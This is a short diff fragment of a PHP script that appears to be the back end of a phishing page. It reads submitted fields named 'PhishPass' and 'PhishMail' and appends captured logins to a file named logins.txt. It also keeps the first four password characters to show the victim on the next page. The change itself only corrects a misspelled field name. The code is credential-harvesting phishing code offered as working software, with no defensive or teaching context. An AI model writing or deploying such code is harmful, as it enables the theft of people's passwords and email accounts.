@@ -3,7 +3,7 @@
 session_start();
 
 $pass = $_POST["PhishPass"];
-$email = $_POST["PhisMail"];
+$email = $_POST["PhishMail"];
 $pass4 = substr($pass, 0, 4);   // Get only 1st 4 characters to display on next page :)
 $file = fopen("logins.txt", "a") or die("Unable to open file!");
 			
